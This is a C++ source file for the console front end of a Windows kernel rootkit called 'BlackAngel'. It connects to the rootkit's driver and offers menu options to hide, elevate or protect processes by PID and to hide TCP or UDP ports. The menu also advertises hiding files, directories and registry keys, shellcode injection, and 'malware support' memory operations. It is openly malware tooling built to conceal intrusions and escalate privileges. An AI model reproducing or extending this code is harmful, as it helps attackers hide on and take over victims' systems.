#include "BAR.hpp"
#include <string>
#include <io.h>
#include <fcntl.h>
#include <vector>

UINT32 GetInputUint()
{
    UINT32 PID = 0;
    std::cout << "PID: "; std::cin >> PID;
    return PID;
}

USHORT GetInputUshort()
{
    USHORT port = 0;
    std::cout << "Port to hide: "; std::cin >> port;
    return port;
}

BOOL GetHideProtocol(BlackAngel::HideProtocol* hp)
{
    UINT32 option = 0;

    std::cout << "1. Local TCP\n";
    std::cout << "2. Remote TCP\n";
    std::cout << "3. UDP\n";
    std::cout << "Protocol to hide: "; std::cin >> option;

    switch (option)
    {
        case 1:
            hp->LTCP = GetInputUshort();
            break;

        case 2: 
            hp->RTCP = GetInputUshort();
            break;

        case 3:
            hp->UDP = GetInputUshort();
            break;

        case 0:
        default:
            return FALSE;
    }

    return TRUE;
}

int main()
{
    if (!BlackAngel::Connect())
            return -1;

    SetConsoleOutputCP(CP_UTF8);
    setvbuf(stdout, nullptr, _IOFBF, 1000);

    while (TRUE)
    {
        UINT32 option = 0;
        system("cls");

        std::cout << u8R"(
 ▄▄▄▄    ██▓    ▄▄▄       ▄████▄   ██ ▄█▀    ▄▄▄       ███▄    █   ▄████ ▓█████  ██▓    
▓█████▄ ▓██▒   ▒████▄    ▒██▀ ▀█   ██▄█▒    ▒████▄     ██ ▀█   █  ██▒ ▀█▒▓█   ▀ ▓██▒    
▒██▒ ▄██▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░▒███   ▒██░    
▒██░█▀  ▒██░   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓▒▓█  ▄ ▒██░    
░▓█  ▀█▓░██████▒▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄    ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒░▒████▒░██████▒
░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒    ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒ ░░ ▒░ ░░ ▒░▓  ░
▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░     ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░  ░ ░  ░░ ░ ▒  ░
 ░    ░   ░ ░    ░   ▒   ░        ░ ░░ ░      ░   ▒      ░   ░ ░ ░ ░   ░    ░     ░ ░   
 ░          ░  ░     ░  ░░ ░      ░  ░            ░  ░         ░       ░    ░  ░    ░  ░
      ░                  ░                                                                                                     
)" << '\n';

        std::cout << "--- Rootkit: ---\n";
        std::cout << "1. Hide Process\n";
        std::cout << "2. Elevate Process\n";
        std::cout << "3. Protect Process\n";
        std::cout << "4. Hide Port\n";
        std::cout << "6. Hide File\n";
        std::cout << "7. Hide Directory\n";
        std::cout << "8. Hide Registry Key\n";
        std::cout << "- Inject Shellcode\n\n";
        std::cout << "--- Malware support: ---\n";
        std::cout << "- Query information process\n";
        std::cout << "- Unmap view of section\n";
        std::cout << "- Allocate virutal memory\n";
        std::cout << "- Write virtual memory\n";
        std::cout << "- Read virtual memory\n";
        std::cout << "- Copy memory\n";
        std::cout << "- Protect virtual memory\n";
        std::cout << "99. Exit\n";
        std::cout << "Option: "; std::cin >> option;

        switch (option)
        {
            case 1:
            {
                UINT32 PID = GetInputUint();
                BlackAngel::HideProcess(PID);
                break;
            }

            case 2:
            {
                UINT32 PID = GetInputUint();
                BlackAngel::ElevateProcess(PID);
                break;
            }

            case 3:
            {
                UINT32 PID = GetInputUint();
                BlackAngel::ProtectProcess(PID);
                break;
            }

            case 4: 
            {
                BlackAngel::HideProtocol hp = { 0 };
                if (!GetHideProtocol(&hp))
                    return -1;
                BlackAngel::HidePort(hp);
            }



            case 99:
                return 0;

            default:
                break;
        }
    }
	return 0;
}